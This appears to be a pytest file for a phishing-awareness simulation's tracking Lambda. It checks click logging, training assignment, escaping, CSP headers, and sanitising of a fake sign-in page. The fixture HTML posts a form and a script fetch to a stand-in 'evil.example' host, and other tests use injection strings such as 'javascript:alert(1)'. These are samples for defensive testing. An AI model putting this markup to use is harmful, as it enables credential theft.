"""tracking: a click is recorded, then the campaign's landing page is shown.
Every table is a stand-in; nothing here calls AWS."""
import importlib.util
import json
import os
from pathlib import Path
from types import SimpleNamespace

import pytest
from botocore.exceptions import ClientError

MODULE_PATH = Path(__file__).resolve().parents[1] / "tracking" / "lambda_function.py"


@pytest.fixture(scope="module")
def mod():
    os.environ.setdefault("AWS_DEFAULT_REGION", "ap-south-1")
    os.environ.setdefault("RECIPIENTS_TABLE", "proj-recipients")
    os.environ.setdefault("EVENTS_TABLE", "proj-events")
    os.environ.setdefault("TRACKING_TOKEN_INDEX", "trackingToken-index")
    spec = importlib.util.spec_from_file_location("tracking", MODULE_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class _Table:
    def __init__(self, rows=None, key=None, fail=False):
        self.rows, self.key, self.fail = rows or {}, key, fail
        self.puts, self.updates = [], []

    def get_item(self, Key):
        if self.fail:
            raise ClientError({"Error": {"Code": "AccessDeniedException", "Message": "no"}}, "GetItem")
        return {"Item": self.rows[Key[self.key]]} if Key[self.key] in self.rows else {}

    def query(self, **kw):
        return {"Items": list(self.rows.values())}

    def put_item(self, Item):
        self.puts.append(Item)

    def update_item(self, **kw):
        self.updates.append(kw)


LP = '<div style="background:#0d58be"><h1>Oops! You have been phished</h1></div>'


def _click(mod, monkeypatch, campaign, pages=None, fail=False):
    monkeypatch.setattr(mod, "recipients_table", _Table({"r": {"campaignId": "CMP-1", "recipientId": "R-1"}}))
    events = _Table()
    monkeypatch.setattr(mod, "events_table", events)
    monkeypatch.setattr(mod, "campaigns_table", _Table({"CMP-1": campaign} if campaign else {}, "campaignId", fail))
    monkeypatch.setattr(mod, "landing_pages_table", _Table(pages or {}, "LandingPageID"))
    resp = mod.lambda_handler({"pathParameters": {"trackingToken": "tok"}}, SimpleNamespace(aws_request_id="t"))
    return resp, events


def test_tables_default_next_to_the_recipients_table(mod):
    prefix = mod.RECIPIENTS_TABLE.rsplit("-", 1)[0]
    assert mod.CAMPAIGNS_TABLE == f"{prefix}-campaigns"
    assert mod.LANDING_PAGES_TABLE == f"{prefix}-landing-pages"
    assert mod._sibling_table("x") == f"{prefix}-x"


def test_the_chosen_catalogue_page_is_shown_after_the_click_is_recorded(mod, monkeypatch):
    resp, events = _click(mod, monkeypatch, {"campaignId": "CMP-1", "landingPageId": "LP-001"}, {"LP-001": {"LandingPageContent": LP}})
    assert resp["statusCode"] == 200
    assert "Oops! You have been phished" in resp["body"] and resp["body"].startswith("<!DOCTYPE html>")
    assert events.puts[0]["eventType"] == "CLICK"


def test_the_campaigns_own_edited_page_wins(mod, monkeypatch):
    own = "<p>Custom page for this campaign</p>"
    resp, _ = _click(mod, monkeypatch, {"landingPageId": "LP-001", "landingPageContent": own}, {"LP-001": {"LandingPageContent": LP}})
    assert own in resp["body"] and "Oops" not in resp["body"]


@pytest.mark.parametrize(
    "campaign, pages",
    [
        ({"landingPageId": "LP-404"}, {}),  # page deleted
        ({"landingPageId": ""}, {}),  # none chosen
        ({"landingPageId": "LP-001"}, {"LP-001": {"LandingPageContent": "   "}}),
        (None, {}),  # campaign gone
    ],
)
def test_no_page_means_the_standard_awareness_page(mod, monkeypatch, campaign, pages):
    resp, events = _click(mod, monkeypatch, campaign, pages)
    assert resp["statusCode"] == 200 and "Security Awareness Training" in resp["body"]
    assert events.puts  # still recorded


def test_unreadable_tables_still_record_and_show_the_standard_page(mod, monkeypatch):
    resp, events = _click(mod, monkeypatch, {"landingPageId": "LP-001"}, fail=True)
    assert resp["statusCode"] == 200 and "Security Awareness Training" in resp["body"]
    assert events.puts


def test_the_page_can_run_no_script_and_submit_no_form(mod, monkeypatch):
    resp, _ = _click(mod, monkeypatch, {"landingPageId": "LP-001"}, {"LP-001": {"LandingPageContent": LP}})
    csp = resp["headers"]["Content-Security-Policy"]
    assert "default-src 'none'" in csp and "script-src" not in csp
    assert "form-action 'none'" in csp


def test_a_bad_token_is_404_and_reads_no_page(mod, monkeypatch):
    monkeypatch.setattr(mod, "recipients_table", _Table({}))
    monkeypatch.setattr(mod, "campaigns_table", _Table({}, "campaignId", fail=True))
    resp = mod.lambda_handler({"pathParameters": {"trackingToken": "nope"}}, SimpleNamespace(aws_request_id="t"))
    assert resp["statusCode"] == 404
    json.dumps(resp)  # serialisable


# --- a click assigns the campaign's training path ---------------------------

class _Assignments:
    def __init__(self, rows=None, fail=None):
        self.rows, self.fail, self.puts = list(rows or []), fail, []

    def query(self, **kw):
        if self.fail:
            raise ClientError({"Error": {"Code": self.fail, "Message": "no"}}, "Query")
        return {"Items": self.rows}

    def put_item(self, Item, ConditionExpression=None):
        self.puts.append(Item)


class _Users:
    def query(self, **kw):
        return {"Items": [{"UserEMailID": "ana@x.example", "Department": "AIDA", "Country": "Spain"}]}


def _assign(mod, monkeypatch, campaign, mine=(), fail=None, recipient=None):
    recipients = _Table()
    assignments = _Assignments(mine, fail)
    monkeypatch.setattr(mod, "recipients_table", recipients)
    monkeypatch.setattr(mod, "campaigns_table", _Table({"CMP-1": campaign}, "campaignId"))
    monkeypatch.setattr(mod, "assignments_table", assignments)
    monkeypatch.setattr(mod, "users_table", _Users())
    who = recipient or {"campaignId": "CMP-1", "recipientId": "R-1", "recipientEmail": "Ana@X.example"}
    out = mod.assign_training("CMP-1", who, "2026-11-10T09:00:00Z")
    return out, assignments, recipients


def test_a_click_assigns_the_campaigns_path_once(mod, monkeypatch):
    out, assignments, recipients = _assign(mod, monkeypatch, {"trainingId": "TP-00001"})
    assert out == "A#2026-11-10T09:00:00Z#TP-00001"
    (row,) = assignments.puts
    assert (row["owner"], row["source"], row["campaignId"], row["recipientId"]) == ("ana@x.example", "ASSIGNED", "CMP-1", "R-1")
    assert (row["department"], row["country"], row["status"]) == ("AIDA", "Spain", "ASSIGNED")
    assert row["dueAt"] == "2026-11-24T09:00:00Z"
    assert recipients.updates[0]["ExpressionAttributeValues"] == {":a": out}


def test_no_assignment_when_there_is_nothing_to_assign(mod, monkeypatch):
    # no path, a test campaign, the path already open, or the click already led to training
    assert _assign(mod, monkeypatch, {})[0] is None
    assert _assign(mod, monkeypatch, {"trainingId": "TP-1", "isTestCampaign": True})[0] is None
    out, assignments, _ = _assign(mod, monkeypatch, {"trainingId": "TP-1"}, mine=[{"TrainingPathID": "TP-1"}])
    assert out is None and assignments.puts == []
    already = {"campaignId": "CMP-1", "recipientId": "R-1", "recipientEmail": "a@x", "trainingAssignmentId": "A#1"}
    assert _assign(mod, monkeypatch, {"trainingId": "TP-1"}, recipient=already)[0] is None
    # a path passed before is assigned again
    assert _assign(mod, monkeypatch, {"trainingId": "TP-1"}, mine=[{"TrainingPathID": "TP-1", "quizPassed": True}])[0]


def test_an_assignment_failure_never_loses_the_click(mod, monkeypatch, capsys):
    out, _, _ = _assign(mod, monkeypatch, {"trainingId": "TP-1"}, fail="AccessDeniedException")
    assert out is None
    assert "Training not assigned" in capsys.readouterr().out


def test_dynamic_fields_are_filled_from_the_recipient_and_escaped(mod):
    page = "<p>Hi @UserName ({{email}}) from @UserDepartment, @UserCountry. @ManagerName|{{employeeId}}|</p>"
    out = mod.personalize_landing(page, {
        "recipientName": "<b>Asha</b>", "recipientEmail": "a@x.com",
        "department": "Ops", "country": "IN",
    })
    assert "Hi &lt;b&gt;Asha&lt;/b&gt; (a@x.com) from Ops, IN." in out
    assert "@" not in out.replace("a@x.com", "") and "{{" not in out


def test_the_served_page_is_personalised(mod, monkeypatch):
    page = {"LandingPageContent": "<h1>Oops @UserName</h1>"}
    monkeypatch.setattr(mod, "recipients_table", _Table({"r": {"campaignId": "CMP-1", "recipientId": "R-1", "recipientName": "Ravi"}}))
    monkeypatch.setattr(mod, "events_table", _Table())
    monkeypatch.setattr(mod, "campaigns_table", _Table({"CMP-1": {"landingPageId": "LP-001"}}, "campaignId"))
    monkeypatch.setattr(mod, "landing_pages_table", _Table({"LP-001": page}, "LandingPageID"))
    resp = mod.lambda_handler({"pathParameters": {"trackingToken": "tok"}}, SimpleNamespace(aws_request_id="t"))
    assert "<h1>Oops Ravi</h1>" in resp["body"]


# --- the browser page (stage 2) and the compromise --------------------------

BROWSER = (
    '<div class="vshield-canvas-item" data-type="card">'
    '<h3>Sign in to @UserName</h3>'
    '<input type="text" name="user" value="{{email}}">'
    '<input type="password" name="pass" form="elsewhere" onfocus="steal()">'
    '<form action="https://evil.example/steal" method="post"><textarea name="otp"></textarea></form>'
    '<script>fetch("https://evil.example")</script>'
    '<div class="vshield-canvas-item" data-action="training">'
    '<a href="{{compromiseLink}}" onclick="return false;" style="display:block;background:#0078D4;color:#fff">Sign in</a>'
    '</div></div>'
)


def _track(mod, monkeypatch, campaign, event_extra=None, pages=None):
    recipients = _Table({"r": {"campaignId": "CMP-1", "recipientId": "R-1", "recipientEmail": "ana@x.example"}})
    events = _Table()
    monkeypatch.setattr(mod, "recipients_table", recipients)
    monkeypatch.setattr(mod, "events_table", events)
    monkeypatch.setattr(mod, "campaigns_table", _Table({"CMP-1": campaign}, "campaignId"))
    monkeypatch.setattr(mod, "landing_pages_table", _Table(pages or {}, "LandingPageID"))
    event = {"pathParameters": {"trackingToken": "tok"}, **(event_extra or {})}
    return mod.lambda_handler(event, SimpleNamespace(aws_request_id="t")), events, recipients


BROWSER_LINK = {"queryStringParameters": {"next": "browser"}}
COMPROMISE = {
    "routeKey": "POST /track/{trackingToken}/compromise",
    "requestContext": {"http": {"method": "POST"}},
    "body": "user=ana%40x.example&pass=hunter2",
}


def test_the_browser_link_records_a_click_and_shows_the_browser_page(mod, monkeypatch):
    resp, events, recipients = _track(mod, monkeypatch, {"browserPageHtml": BROWSER, "landingPageId": "LP-001"}, BROWSER_LINK)
    body = resp["body"]
    assert resp["statusCode"] == 200 and "Sign in to " in body
    assert events.puts[0]["eventType"] == "CLICK" and events.puts[0]["stage"] == "BROWSER_PAGE"
    assert "clickedAt" in recipients.updates[0]["UpdateExpression"]
    assert '<form method="post" action="tok/compromise"' in body
    assert "form-action 'self'" in resp["headers"]["Content-Security-Policy"]
    assert 'value="ana@x.example"' in body  # personalised


def test_the_browser_page_can_send_nothing_typed(mod, monkeypatch):
    body = _track(mod, monkeypatch, {"browserPageHtml": BROWSER}, BROWSER_LINK)[0]["body"]
    body = body[body.index("<body>"):]
    assert "name=" not in body and 'form="' not in body
    assert "<script" not in body and "evil.example" not in body
    assert "onclick" not in body and "onfocus" not in body
    assert body.count("<form") == 1  # only the page's own
    # the link became a submit button that keeps its look
    assert '<button type="submit" class="vshield-canvas-item"' not in body
    assert '<button type="submit" style="border:none;' in body and "background:#0078D4" in body
    assert "<a " not in body
    assert "width:100%;display:block" in body  # a block link still fills its row
    assert "contenteditable" not in _track(mod, monkeypatch, {"browserPageHtml": '<p contenteditable="true" style="cursor: move">Hi</p>'}, BROWSER_LINK)[0]["body"]


def test_no_browser_page_means_the_landing_page(mod, monkeypatch):
    resp, events, _ = _track(mod, monkeypatch, {"landingPageId": "LP-001"}, BROWSER_LINK, {"LP-001": {"LandingPageContent": LP}})
    assert "Oops! You have been phished" in resp["body"]
    assert "form-action 'none'" in resp["headers"]["Content-Security-Policy"]
    assert events.puts[0]["eventType"] == "CLICK"


def test_a_plain_link_still_shows_the_landing_page_when_a_browser_page_exists(mod, monkeypatch):
    resp, events, _ = _track(mod, monkeypatch, {"browserPageHtml": BROWSER, "landingPageId": "LP-001"}, None, {"LP-001": {"LandingPageContent": LP}})
    assert "Oops! You have been phished" in resp["body"] and events.puts[0]["stage"] == "LANDING_PAGE"


def test_submitting_the_browser_page_marks_compromised_and_shows_the_landing_page(mod, monkeypatch, capsys):
    resp, events, recipients = _track(mod, monkeypatch, {"browserPageHtml": BROWSER, "landingPageId": "LP-001"}, COMPROMISE, {"LP-001": {"LandingPageContent": LP}})
    assert resp["statusCode"] == 200 and "Oops! You have been phished" in resp["body"]
    (event,) = events.puts
    assert event["eventType"] == "COMPROMISE" and event["eventSource"] == "BROWSER_PAGE"
    update = recipients.updates[0]
    assert "compromisedAt = if_not_exists(compromisedAt" in update["UpdateExpression"]
    assert "clickedAt = if_not_exists(clickedAt" in update["UpdateExpression"]
    # nothing that was typed is stored or logged
    stored = json.dumps([events.puts, recipients.updates]) + capsys.readouterr().out
    assert "hunter2" not in stored and "ana%40" not in stored


def test_a_compromise_with_a_bad_token_is_404(mod, monkeypatch):
    monkeypatch.setattr(mod, "recipients_table", _Table({}))
    events = _Table()
    monkeypatch.setattr(mod, "events_table", events)
    resp = mod.lambda_handler({"pathParameters": {"trackingToken": "nope"}, **COMPROMISE}, SimpleNamespace(aws_request_id="t"))
    assert resp["statusCode"] == 404 and events.puts == []


def test_the_landing_pages_training_link_leaves_the_api_domain(mod, monkeypatch):
    page = {"LandingPageContent": '<a href="/my-training" target="_top">Start training</a>'}
    campaign = {"landingPageId": "LP-001", "appBaseUrl": "https://app.example.com/"}
    resp, _, _ = _track(mod, monkeypatch, campaign, None, {"LP-001": page})
    assert 'href="https://app.example.com/my-training"' in resp["body"]


def test_the_standard_page_links_training_only_to_a_plain_origin(mod, monkeypatch):
    resp, _, _ = _track(mod, monkeypatch, {"appBaseUrl": "https://app.example.com"})
    assert 'href="https://app.example.com/my-training"' in resp["body"]
    for bad in ("javascript:alert(1)", "https://x.example/path", "https://x.example\" onmouseover=\"y"):
        resp, _, _ = _track(mod, monkeypatch, {"appBaseUrl": bad})
        assert "<a class=\"training-button\"" not in resp["body"]
        assert "Your security training has been assigned" in resp["body"]


def test_app_base_url_env_wins(mod, monkeypatch):
    monkeypatch.setattr(mod, "APP_BASE_URL", "https://vshield.example.com")
    assert mod.training_url({"appBaseUrl": "http://localhost:5173"}) == "https://vshield.example.com/my-training"
    monkeypatch.setattr(mod, "APP_BASE_URL", "")
    assert mod.training_url({"appBaseUrl": "http://localhost:5173"}) == "http://localhost:5173/my-training"
    assert mod.training_url(None) is None
